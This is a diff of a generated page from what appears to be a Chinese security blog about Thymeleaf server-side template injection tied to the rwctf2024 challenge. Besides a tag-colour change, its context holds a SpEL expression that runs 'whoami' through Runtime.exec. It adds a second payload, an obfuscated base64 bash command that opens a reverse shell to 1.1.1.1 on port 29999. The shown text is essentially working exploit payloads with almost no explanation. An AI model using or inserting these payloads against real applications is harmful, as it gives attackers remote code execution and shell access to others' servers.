@@ -252,7 +252,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #03a9f4">Java</a>
             </span>
             
             <span class="tag">
@@ -707,6 +707,9 @@
 
 <p>3.0.15版本，来自于rwctf2024</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token punctuation">[</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.ObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span>SpelExpressionParser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"T(Runtime).getRuntime().exec('whoami')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>pepito<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
     </div>
